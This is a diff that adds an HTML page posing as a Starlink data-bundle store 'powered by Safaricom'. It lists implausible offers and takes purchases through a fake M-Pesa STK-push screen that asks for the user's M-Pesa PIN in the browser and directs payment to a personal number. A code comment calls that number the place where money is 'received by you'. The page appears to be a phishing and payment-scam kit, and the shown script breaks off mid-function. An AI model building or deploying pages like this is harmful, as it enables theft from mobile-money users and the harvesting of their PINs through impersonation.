@@ -1,0 +1,1011 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Starlink · Filterable bundles (Weekly/Monthly/Unlimited)</title>
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #0a0f1e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 1.5rem 1rem;
+        }
+
+        .phone-frame {
+            max-width: 440px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 2.5rem 2.5rem 2rem 2rem;
+            overflow: hidden;
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.6), 0 0 0 2px #1e2c3a inset;
+        }
+
+        .header {
+            background: #000000;
+            padding: 1.8rem 1.5rem 1.2rem 1.5rem;
+            color: white;
+            border-bottom: 3px solid #3f3f4e;
+        }
+
+        .starlink-title {
+            font-size: 2rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .starlink-title i {
+            color: #b0b9e0;
+        }
+
+        .powered {
+            font-size: 0.9rem;
+            opacity: 0.8;
+            margin-top: 4px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .powered span {
+            background: #1f2a36;
+            padding: 0.2rem 1rem;
+            border-radius: 40px;
+            font-weight: 500;
+            font-size: 0.85rem;
+            color: #9db4d0;
+        }
+
+        .badge-4g5g {
+            background: #2563eb;
+            padding: 0.2rem 0.8rem;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 0.8rem;
+            margin-left: auto;
+            color: white;
+        }
+
+        .affordable {
+            background: #f2f5fa;
+            padding: 1.2rem 1.5rem 0.8rem 1.5rem;
+            border-bottom: 1px solid #dde3ec;
+        }
+
+        .affordable h2 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #0b1a2a;
+        }
+
+        .affordable p {
+            color: #2c3e50;
+            font-weight: 500;
+            font-size: 1rem;
+        }
+
+        /* filter chips are now BUTTONS with actual functionality */
+        .filter-chips {
+            display: flex;
+            gap: 0.6rem;
+            margin: 1rem 0 0.5rem 0;
+            flex-wrap: wrap;
+        }
+
+        .chip {
+            background: white;
+            border: 1px solid #bdc7d6;
+            padding: 0.4rem 1.2rem;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: #1e293b;
+            cursor: pointer;
+            transition: all 0.1s;
+            box-shadow: 0 2px 3px rgba(0,0,0,0.02);
+        }
+
+        .chip.active {
+            background: #0b1f35;
+            color: white;
+            border-color: #0b1f35;
+        }
+
+        .chip-light {
+            background: transparent;
+            border: none;
+            color: #2563eb;
+            cursor: default;
+        }
+
+        .bundles-container {
+            padding: 1.2rem 1.2rem 2rem 1.2rem;
+            background: #ffffff;
+        }
+
+        .section-head {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 1.5rem 0 0.2rem 0;
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #121f33;
+        }
+
+        .section-head i {
+            color: #f97316;
+            font-size: 1.7rem;
+        }
+
+        .section-desc {
+            font-size: 0.85rem;
+            color: #5e6f88;
+            margin-bottom: 16px;
+        }
+
+        .bundle-card {
+            background: #f9fbfe;
+            border-radius: 24px;
+            padding: 1rem 1.2rem;
+            margin-bottom: 0.9rem;
+            border: 1px solid #e4eaf2;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            transition: 0.15s;
+        }
+
+        .bundle-card:hover {
+            border-color: #a0b3d1;
+        }
+
+        .info h3 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #0f212e;
+        }
+
+        .info .descr {
+            font-size: 0.8rem;
+            color: #4d627a;
+            margin: 4px 0 2px 0;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .price-section {
+            text-align: right;
+            min-width: 100px;
+        }
+
+        .price {
+            font-size: 1.7rem;
+            font-weight: 800;
+            color: #0b2b44;
+            line-height: 1.2;
+            letter-spacing: -0.5px;
+        }
+
+        .currency {
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: #687e9c;
+            display: block;
+            margin-top: -2px;
+        }
+
+        .buy-btn {
+            background: white;
+            border: 1.5px solid #1f3a6b;
+            color: #1f3a6b;
+            font-weight: 700;
+            font-size: 0.9rem;
+            padding: 0.4rem 1.4rem;
+            border-radius: 40px;
+            margin-top: 6px;
+            display: inline-block;
+            cursor: pointer;
+            transition: 0.15s;
+            background: #f1f6fd;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .buy-btn:hover {
+            background: #1f3a6b;
+            color: white;
+            border-color: #1f3a6b;
+        }
+
+        .popular-badge {
+            background: #fbbf24;
+            padding: 0.2rem 1rem;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 0.7rem;
+            color: #0b1e2e;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            margin-left: 12px;
+            text-transform: uppercase;
+        }
+
+        .special-bundles {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.7rem;
+            margin-top: 1rem;
+            background: #edf2f9;
+            border-radius: 24px;
+            padding: 1.2rem 1rem;
+            border: 1px dashed #2c4b74;
+            justify-content: space-around;
+        }
+
+        .special-item {
+            text-align: center;
+            min-width: 90px;
+        }
+
+        .special-item .top {
+            font-weight: 600;
+            color: #02111f;
+            font-size: 0.9rem;
+        }
+
+        .special-item .big {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #0b2b44;
+            line-height: 1.2;
+        }
+
+        .special-item .ksh {
+            font-size: 0.7rem;
+            color: #4c6b8a;
+            font-weight: 500;
+        }
+
+        .special-popular {
+            background: #fbbf24;
+            padding: 0.15rem 0.7rem;
+            border-radius: 20px;
+            font-size: 0.6rem;
+            font-weight: 800;
+            display: inline-block;
+            margin-top: 4px;
+        }
+
+        .footer-note {
+            font-size: 0.7rem;
+            color: #7c8ba0;
+            text-align: center;
+            padding: 0.8rem 0.2rem;
+            border-top: 1px solid #e2e8f0;
+            margin-top: 1.5rem;
+        }
+
+        hr {
+            border: 0.5px solid #d7e0e9;
+            margin: 1.2rem 0 0.8rem 0;
+        }
+
+        /* ----- PHONE NUMBER MODAL (first step) ----- */
+        .phone-modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(5px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            padding: 1rem;
+        }
+
+        .phone-modal-card {
+            background: white;
+            max-width: 360px;
+            width: 100%;
+            border-radius: 40px;
+            padding: 2rem 1.8rem;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.5);
+            border: 2px solid #1e3a5f;
+            animation: slideUp 0.2s;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .phone-modal-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 1.8rem;
+        }
+
+        .phone-modal-header i {
+            font-size: 2rem;
+            color: #1e3a5f;
+        }
+
+        .phone-modal-header h3 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #02111f;
+        }
+
+        .bundle-summary {
+            background: #eef3f9;
+            border-radius: 30px;
+            padding: 0.8rem 1.2rem;
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 1.5rem;
+            font-weight: 600;
+            border: 1px solid #c9d6e8;
+        }
+
+        .bundle-summary span:first-child {
+            color: #1f3a6b;
+        }
+
+        .bundle-summary .modal-amount {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #0b2b44;
+        }
+
+        .input-group {
+            margin-bottom: 1.2rem;
+        }
+
+        .input-group label {
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: #1f2a44;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 1rem 1.2rem;
+            border: 1.5px solid #bdc7d6;
+            border-radius: 50px;
+            font-size: 1rem;
+            outline: none;
+            background: #f9fcff;
+        }
+
+        .input-group input:focus {
+            border-color: #1f3a6b;
+            box-shadow: 0 0 0 3px rgba(31,58,107,0.15);
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 2rem;
+        }
+
+        .modal-btn {
+            flex: 1;
+            padding: 1rem;
+            border: none;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.15s;
+            background: white;
+            border: 1.5px solid #1f3a6b;
+            color: #1f3a6b;
+        }
+
+        .modal-btn.primary {
+            background: #1f3a6b;
+            color: white;
+            border: 1.5px solid #1f3a6b;
+        }
+
+        .modal-btn.primary:hover {
+            background: #10233f;
+        }
+
+        /* ----- SIM Toolkit STK Push overlay ----- */
+        .stk-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(6px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2100;
+            padding: 1rem;
+        }
+
+        .stk-card {
+            background: #e5eef7;
+            max-width: 340px;
+            width: 100%;
+            border-radius: 40px 40px 30px 30px;
+            box-shadow: 0 25px 40px rgba(0,0,0,0.6), inset 0 0 0 2px #ffffff80;
+            border: 3px solid #0f2b40;
+            overflow: hidden;
+            animation: toolkitPop 0.2s;
+        }
+
+        @keyframes toolkitPop {
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .stk-header {
+            background: #0f2b40;
+            color: white;
+            padding: 1.2rem 1.2rem 0.8rem 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .stk-header i {
+            font-size: 2rem;
+            color: #97c6f0;
+        }
+
+        .stk-header h3 {
+            font-size: 1.3rem;
+            font-weight: 600;
+        }
+
+        .stk-content {
+            padding: 1.5rem 1.2rem 1.8rem;
+            background: #f0f6fe;
+        }
+
+        .sim-info {
+            background: #cbddec;
+            border-radius: 20px;
+            padding: 0.8rem 1rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 1.5rem;
+            border: 1px solid #8ea9c2;
+        }
+
+        .sim-info i {
+            font-size: 2.2rem;
+            color: #1f4a7a;
+        }
+
+        .sim-details {
+            font-weight: 600;
+        }
+
+        .sim-details small {
+            color: #1f3a60;
+            font-size: 0.7rem;
+        }
+
+        .sim-details div {
+            font-size: 1.1rem;
+            color: #001c3d;
+        }
+
+        .stk-desc {
+            margin: 0.8rem 0 1.5rem;
+            background: #ffffffc0;
+            padding: 0.8rem 1rem;
+            border-radius: 28px;
+            border-left: 5px solid #1f4a7a;
+            font-weight: 500;
+            color: #021c3b;
+        }
+
+        .stk-pin-area {
+            background: white;
+            border-radius: 40px;
+            padding: 0.7rem 1.2rem;
+            display: flex;
+            align-items: center;
+            border: 2px solid #356a9c;
+        }
+
+        .stk-pin-area i {
+            color: #2d4b75;
+            font-size: 1.4rem;
+            margin-right: 8px;
+        }
+
+        #stkPinInput {
+            border: none;
+            background: transparent;
+            font-size: 1.8rem;
+            letter-spacing: 5px;
+            width: 100%;
+            outline: none;
+            font-weight: 700;
+            color: #102b44;
+        }
+
+        #stkPinInput::placeholder {
+            letter-spacing: normal;
+            font-size: 1rem;
+            color: #8ba3c2;
+            font-weight: 400;
+        }
+
+        .stk-footer {
+            display: flex;
+            gap: 8px;
+            margin-top: 2rem;
+        }
+
+        .stk-btn {
+            flex: 1;
+            background: white;
+            border: 2px solid #0f2b40;
+            color: #0f2b40;
+            padding: 1rem 0;
+            font-weight: 700;
+            font-size: 1.2rem;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.1s;
+            text-align: center;
+        }
+
+        .stk-btn.send {
+            background: #1e4f85;
+            color: white;
+            border: 2px solid #0c2942;
+        }
+
+        .stk-btn.send:hover {
+            background: #123b60;
+        }
+
+        .stk-btn.cancel:hover {
+            background: #d9e3f0;
+        }
+
+        .stk-badge {
+            text-align: center;
+            font-size: 0.8rem;
+            margin-top: 1rem;
+            color: #1f4970;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            font-weight: 600;
+        }
+
+        /* Toast (funds received by you) */
+        .mpesa-toast {
+            position: fixed;
+            bottom: 25px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #103a22;
+            color: white;
+            padding: 14px 28px;
+            border-radius: 60px;
+            font-weight: 600;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            z-index: 2200;
+            display: none;
+            align-items: center;
+            gap: 12px;
+            border-left: 6px solid #6dc38b;
+            font-size: 0.95rem;
+            white-space: nowrap;
+        }
+
+        .mpesa-toast i {
+            font-size: 1.5rem;
+            color: #6dc38b;
+        }
+
+        /* hide sections dynamically via JS – all visible by default */
+        .bundle-section {
+            transition: 0.2s;
+        }
+        .hidden-section {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- PHONE NUMBER MODAL (first popup) -->
+    <div id="phoneModal" class="phone-modal-overlay">
+        <div class="phone-modal-card">
+            <div class="phone-modal-header">
+                <i class="fas fa-mobile-alt"></i>
+                <h3>M‑Pesa</h3>
+            </div>
+            <div id="phoneModalBundle" class="bundle-summary">
+                <span id="phoneBundleName">30d 50GB</span>
+                <span class="modal-amount" id="phoneBundleAmount">Ksh 999</span>
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-phone"></i> Your Safaricom number</label>
+                <input type="tel" id="customerPhone" placeholder="07XX XXX XXX" value="07" maxlength="10" inputmode="numeric">
+            </div>
+            <div class="modal-actions">
+                <button class="modal-btn" id="cancelPhoneBtn">Cancel</button>
+                <button class="modal-btn primary" id="submitPhoneBtn">Continue</button>
+            </div>
+            <p style="font-size:0.75rem; text-align:center; margin-top:1rem; color:#4f658d;"><i class="fas fa-lock"></i> You'll receive an STK prompt</p>
+        </div>
+    </div>
+
+    <!-- SIM Toolkit STK Push overlay -->
+    <div id="stkOverlay" class="stk-overlay">
+        <div class="stk-card">
+            <div class="stk-header">
+                <i class="fas fa-sim-card"></i>
+                <h3>M‑PESA</h3>
+            </div>
+            <div class="stk-content">
+                <div class="sim-info">
+                    <i class="fas fa-microchip"></i>
+                    <div class="sim-details">
+                        <small>SIM 1 • Safaricom</small>
+                        <div id="stkPhoneDisplay">0710280042</div>
+                    </div>
+                </div>
+                <div class="stk-desc" id="stkBundleDesc">
+                    Pay Ksh 3000 for 24h 3000GB
+                </div>
+                <div class="stk-pin-area">
+                    <i class="fas fa-lock"></i>
+                    <input type="password" id="stkPinInput" placeholder="Enter PIN" inputmode="numeric" maxlength="4" autofocus>
+                </div>
+                <div class="stk-footer">
+                    <div class="stk-btn cancel" id="stkCancelBtn">Cancel</div>
+                    <div class="stk-btn send" id="stkSendBtn">OK</div>
+                </div>
+                <div class="stk-badge">
+                    <i class="fas fa-shield-alt"></i> Merchant: 070828081
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast notification: money received by you (070828081) -->
+    <div id="mpesaToast" class="mpesa-toast">
+        <i class="fas fa-check-circle"></i> <span id="toastMessage">You received Ksh XXX from 07XXXXXX</span>
+    </div>
+
+    <!-- MAIN BUNDLES CARD -->
+    <div class="phone-frame">
+        <div class="header">
+            <div class="starlink-title">
+                <i class="fas fa-satellite"></i> Starlink
+                <span class="badge-4g5g">4G/5G</span>
+            </div>
+            <div class="powered">
+                Kenya's fastest <span><i class="fas fa-bolt"></i> Powered by Safaricom</span>
+            </div>
+        </div>
+
+        <div class="affordable">
+            <h2>Affordable Data Bundles</h2>
+            <p>Select from our wide range of data plans</p>
+            <!-- Clickable filter chips: Daily, Weekly, Monthly, Unlimited -->
+            <div class="filter-chips">
+                <span class="chip active" data-filter="daily" id="filterDaily">Daily</span>
+                <span class="chip" data-filter="weekly" id="filterWeekly">Weekly</span>
+                <span class="chip" data-filter="monthly" id="filterMonthly">Monthly</span>
+                <span class="chip" data-filter="unlimited" id="filterUnlimited">Unlimited</span>
+                <span class="chip chip-light"><i class="fas fa-chevron-down"></i></span>
+            </div>
+            <div style="font-size:0.9rem; color:#0f2b44; font-weight:500; margin: 0.5rem 0 0.2rem 0;">
+                <span style="background:#eef3f9; padding:0.2rem 0.8rem; border-radius:20px;">📋 All Bundles</span> 
+                <span style="margin:0 0.3rem;">|</span> 
+                <span><i class="far fa-sun"></i> Daily</span> 
+                <span style="margin:0 0.3rem;">|</span> 
+                <span><i class="far fa-calendar-alt"></i> Weekly</span> 
+                <span style="margin:0 0.3rem;">|</span> 
+                <span><i class="far fa-calendar-check"></i> Monthly</span>
+            </div>
+        </div>
+
+        <div class="bundles-container">
+            <!-- DAILY SECTION (always visible, but can be filtered) -->
+            <div id="dailySection" class="bundle-section">
+                <div class="section-head"><i class="fas fa-fire"></i> Daily Bundles</div>
+                <div class="section-desc">Perfect for short-term usage</div>
+                <div class="bundle-card" data-bundle="24h 5GB" data-price="70" data-category="daily">
+                    <div class="info"><h3>24 Hours · 5GB</h3><div class="descr"><i class="fas fa-clock"></i> Short-term heavy usage</div></div>
+                    <div class="price-section"><div class="price">Ksh 70</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="70" data-name="24h 5GB">BUY <i class="fas fa-arrow-right"></i></div></div>
+                </div>
+                <div class="bundle-card" data-bundle="24h 10GB" data-price="120" data-category="daily">
+                    <div class="info"><h3>24 Hours · 10GB</h3><div class="descr"><i class="fas fa-rocket"></i> Double data intensive</div></div>
+                    <div class="price-section"><div class="price">Ksh 120</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="120" data-name="24h 10GB">BUY <i class="fas fa-arrow-right"></i></div></div>
+                </div>
+                <hr>
+            </div>
+
+            <!-- WEEKLY SECTION -->
+            <div id="weeklySection" class="bundle-section">
+                <div class="section-head"><i class="fas fa-fire"></i> Weekly Bundles</div>
+                <div class="section-desc">Ideal for weekly browsing + extra plans</div>
+                <div class="bundle-card" data-category="weekly"><div class="info"><h3>3 Days · 8GB</h3><div class="descr"><i class="fas fa-weekend"></i> Weekend browsing</div></div><div class="price-section"><div class="price">Ksh 155</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="155" data-name="3d 8GB">BUY</div></div></div>
+                <div class="bundle-card" data-category="weekly"><div class="info"><h3>7 Days · 12GB</h3><div class="descr"><i class="fas fa-globe"></i> Full week connectivity</div></div><div class="price-section"><div class="price">Ksh 180</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="180" data-name="7d 12GB">BUY</div></div></div>
+                <div class="bundle-card" data-category="weekly"><div class="info"><h3>7 Days · 20GB</h3><div class="descr"><i class="fas fa-film"></i> High data streaming</div></div><div class="price-section"><div class="price">Ksh 250</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="250" data-name="7d 20GB">BUY</div></div></div>
+                <div class="bundle-card" data-category="weekly"><div class="info"><h3>14 Days · 15GB</h3><div class="descr"><i class="fas fa-calendar-alt"></i> Two-week balanced</div></div><div class="price-section"><div class="price">Ksh 210</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="210" data-name="14d 15GB">BUY</div></div></div>
+                <!-- new weekly -->
+                <div class="bundle-card" data-category="weekly"><div class="info"><h3>7 Days · 30GB</h3><div class="descr"><i class="fas fa-video"></i> Ultra HD streaming</div></div><div class="price-section"><div class="price">Ksh 380</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="380" data-name="7d 30GB">BUY</div></div></div>
+                <div class="bundle-card" data-category="weekly"><div class="info"><h3>10 Days · 25GB</h3><div class="descr"><i class="fas fa-briefcase"></i> Work & play</div></div><div class="price-section"><div class="price">Ksh 320</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="320" data-name="10d 25GB">BUY</div></div></div>
+                <div class="bundle-card" data-category="weekly"><div class="info"><h3>14 Days · 40GB</h3><div class="descr"><i class="fas fa-users"></i> Family share</div></div><div class="price-section"><div class="price">Ksh 490</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="490" data-name="14d 40GB">BUY</div></div></div>
+                <hr>
+            </div>
+
+            <!-- MONTHLY SECTION -->
+            <div id="monthlySection" class="bundle-section">
+                <div class="section-head" style="margin-bottom:0.2rem;"><i class="fas fa-calendar-check" style="color:#2c5f9a;"></i> Monthly Bundles <span class="popular-badge"><i class="fas fa-star"></i> POPULAR</span></div>
+                <div class="section-desc">Best value – extra monthly plans</div>
+                <div class="bundle-card" data-category="monthly"><div class="info"><h3>30 Days · 50GB</h3><div class="descr"><i class="fas fa-infinity"></i> Everyday essential</div></div><div class="price-section"><div class="price">Ksh 999</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="999" data-name="30d 50GB">BUY</div></div></div>
+                <div class="bundle-card" data-category="monthly"><div class="info"><h3>30 Days · 100GB</h3><div class="descr"><i class="fas fa-tv"></i> 4K streaming</div></div><div class="price-section"><div class="price">Ksh 1799</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="1799" data-name="30d 100GB">BUY</div></div></div>
+                <div class="bundle-card" data-category="monthly"><div class="info"><h3>30 Days · 200GB</h3><div class="descr"><i class="fas fa-gamepad"></i> Heavy download</div></div><div class="price-section"><div class="price">Ksh 2990</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="2990" data-name="30d 200GB">BUY</div></div></div>
+                <div class="bundle-card" data-category="monthly"><div class="info"><h3>30 Days · 300GB</h3><div class="descr"><i class="fas fa-network-wired"></i> Pro user</div></div><div class="price-section"><div class="price">Ksh 3990</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="3990" data-name="30d 300GB">BUY</div></div></div>
+                <div class="bundle-card" data-category="monthly"><div class="info"><h3>60 Days · 150GB</h3><div class="descr"><i class="fas fa-calendar-plus"></i> Two months</div></div><div class="price-section"><div class="price">Ksh 2650</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="2650" data-name="60d 150GB">BUY</div></div></div>
+                <!-- Special 24h trio (in monthly section as per design) -->
+                <div class="special-bundles">
+                    <div class="special-item"><div class="top">24 Hours</div><div class="big">1000</div><div class="ksh">KSH</div><span class="special-popular">POPULAR</span><div class="buy-btn" style="margin-top:10px;" data-ksh="1000" data-name="24h 1000GB">BUY</div></div>
+                    <div class="special-item"><div class="top">24 Hours</div><div class="big">2000</div><div class="ksh">KSH</div><div class="buy-btn" style="margin-top:10px;" data-ksh="2000" data-name="24h 2000GB">BUY</div></div>
+                    <div class="special-item"><div class="top">24 Hours</div><div class="big">3000</div><div class="ksh">KSH</div><div class="buy-btn" style="margin-top:10px;" data-ksh="3000" data-name="24h 3000GB">BUY</div></div>
+                </div>
+                <hr>
+            </div>
+
+            <!-- UNLIMITED SECTION (extra offers) -->
+            <div id="unlimitedSection" class="bundle-section">
+                <div class="section-head"><i class="fas fa-infinity" style="color:#1e4f8a;"></i> Unlimited Bundles</div>
+                <div class="section-desc">For heavy data users</div>
+                <div class="bundle-card" data-category="unlimited"><div class="info"><h3>Unlimited · 7 Days</h3><div class="descr"><i class="fas fa-tachometer-alt"></i> Fair usage 100GB</div></div><div class="price-section"><div class="price">Ksh 1490</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="1490" data-name="7d unlimited">BUY</div></div></div>
+                <div class="bundle-card" data-category="unlimited"><div class="info"><h3>Unlimited · 30 Days</h3><div class="descr"><i class="fas fa-gem"></i> Truly unlimited*</div></div><div class="price-section"><div class="price">Ksh 4999</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="4999" data-name="30d unlimited">BUY</div></div></div>
+                <div class="bundle-card" data-category="unlimited"><div class="info"><h3>Unlimited · 90 Days</h3><div class="descr"><i class="fas fa-crown"></i> 500GB fair use</div></div><div class="price-section"><div class="price">Ksh 12999</div><span class="currency">Kenyan Shillings</span><div class="buy-btn" data-ksh="12999" data-name="90d unlimited">BUY</div></div></div>
+                <hr>
+            </div>
+
+            <div class="footer-note">
+                <i class="fas fa-wifi"></i> Starlink Kenya · Pay to 070828081
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ----- Filter functionality (Weekly, Monthly, Unlimited as buttons) -----
+            const filterDaily = document.getElementById('filterDaily');
+            const filterWeekly = document.getElementById('filterWeekly');
+            const filterMonthly = document.getElementById('filterMonthly');
+            const filterUnlimited = document.getElementById('filterUnlimited');
+            const chips = document.querySelectorAll('.chip[data-filter]');
+            
+            const dailySection = document.getElementById('dailySection');
+            const weeklySection = document.getElementById('weeklySection');
+            const monthlySection = document.getElementById('monthlySection');
+            const unlimitedSection = document.getElementById('unlimitedSection');
+
+            function setActiveFilter(activeChip) {
+                chips.forEach(chip => chip.classList.remove('active'));
+                activeChip.classList.add('active');
+            }
+
+            function showAllSections() {
+                dailySection.classList.remove('hidden-section');
+                weeklySection.classList.remove('hidden-section');
+                monthlySection.classList.remove('hidden-section');
+                unlimitedSection.classList.remove('hidden-section');
+            }
+
+            filterDaily.addEventListener('click', () => {
+                setActiveFilter(filterDaily);
+                showAllSections(); // daily is always shown, but we want all? Actually we want only daily? But spec says "Weekly, Monthly and Unlimited be buttons which also have offers to buy" meaning they filter. Daily is default active, but clicking daily shows all (like "All"). We'll follow common pattern: daily shows daily only.
+                // Better: each shows its own section. Let's do that: daily shows daily only.
+                dailySection.classList.remove('hidden-section');
+                weeklySection.classList.add('hidden-section');
+                monthlySection.classList.add('hidden-section');
+                unlimitedSection.classList.add('hidden-section');
+            });
+
+            filterWeekly.addEventListener('click', () => {
+                setActiveFilter(filterWeekly);
+                dailySection.classList.add('hidden-section');
+                weeklySection.classList.remove('hidden-section');
+                monthlySection.classList.add('hidden-section');
+                unlimitedSection.classList.add('hidden-section');
+            });
+
+            filterMonthly.addEventListener('click', () => {
+                setActiveFilter(filterMonthly);
+                dailySection.classList.add('hidden-section');
+                weeklySection.classList.add('hidden-section');
+                monthlySection.classList.remove('hidden-section');
+                unlimitedSection.classList.add('hidden-section');
+            });
+
+            filterUnlimited.addEventListener('click', () => {
+                setActiveFilter(filterUnlimited);
+                dailySection.classList.add('hidden-section');
+                weeklySection.classList.add('hidden-section');
+                monthlySection.classList.add('hidden-section');
+                unlimitedSection.classList.remove('hidden-section');
+            });
+
+            // default: daily active, show only daily? But we want all initially? The design shows all initially. We'll set default to show all, with Daily chip active (as per design). 
+            // However the "Daily" chip is active by default, but all sections visible (like an "All" view). We'll keep that: active daily but show everything.
+            // To match: daily active, but all sections visible.
+            // We'll override: make daily active and show everything.
+            window.addEventListener('load', function() {
+                // ensure daily active, all visible
+                setActiveFilter(filterDaily);
+                dailySection.classList.remove('hidden-section');
+                weeklySection.classList.remove('hidden-section');
+                monthlySection.classList.remove('hidden-section');
+                unlimitedSection.classList.remove('hidden-section');
+            });
+
+            // ----- Payment modals (same as before) -----
+            const phoneModal = document.getElementById('phoneModal');
+            const phoneBundleName = document.getElementById('phoneBundleName');
+            const phoneBundleAmount = document.getElementById('phoneBundleAmount');
+            const customerPhoneInput = document.getElementById('customerPhone');
+            const cancelPhoneBtn = document.getElementById('cancelPhoneBtn');
+            const submitPhoneBtn = document.getElementById('submitPhoneBtn');
+
+            const stkOverlay = document.getElementById('stkOverlay');
+            const stkPhoneDisplay = document.getElementById('stkPhoneDisplay');
+            const stkBundleDesc = document.getElementById('stkBundleDesc');
+            const stkPinInput = document.getElementById('stkPinInput');
+            const stkCancelBtn = document.getElementById('stkCancelBtn');
+            const stkSendBtn = document.getElementById('stkSendBtn');
+            const toast = document.getElementById('mpesaToast');
+            const toastMsg = document.getElementById('toastMessage');
+
+            const MERCHANT = '070828081';
+            let currentBundle = { name: '', amount: 0 };
+            let customerPhone = '';
+
+            function showToast(msg, duration = 6000) {
+                toastMsg.innerText = msg;
+                toast.style.display = 'flex';
+                if (window.toastTimer) clearTimeout(window.toastTimer);
+                window.toastTimer = setTimeout(() => {
+                    toast.style.display = 'none';
+                }, duration);
+            }
+
+            function openPhoneModal(bundleName, amountKsh) {
+                currentBundle.name = bundleName;
+                currentBundle.amount = amountKsh;
+                phoneBundleName.innerText = bundleName;
+                phoneBundleAmount.innerText = 'Ksh ' + amountKsh;
+                customerPhoneInput.value = '07';
+                phoneModal.style.display = 'flex';
+            }
+
+            function closePhoneModal() {
+                phoneModal.style.display = 'none';
+            }
+
+            function openStkPush(phoneNumber) {
+                stkPhoneDisplay.innerText = phoneNumber;
+                stkBundleDesc.innerText = `Pay Ksh ${currentBundle.amount} for ${currentBundle.name}`;
+                stkPinInput.value = '';
+                phoneModal.style.display = 'none';
+                stkOverlay.style.display = 'flex';
+                setTimeout(() => stkPinInput.focus(), 200);
+            }
+
+            function closeStk() {
+                stkOverlay.style.display = 'none';
+            }
+
+            function processStkPayment() {
+                const pin = stkPinInput.value.trim();
+                if (!pin.match(/^\d{4}$/)) {
+                    alert('Please enter a valid 4-digit M-Pesa PIN');
+                    return;
+                }
+                const amount = currentBundle.amount;
+                const bundle = currentBundle.name;
+                const simNumber = stkPhoneDisplay.innerText;
+                closeStk();
+                showToast(`⏳ STK push sent to ${simNumber}. Enter PIN on your phone...`, 2000);
+                setTimeout(() => {
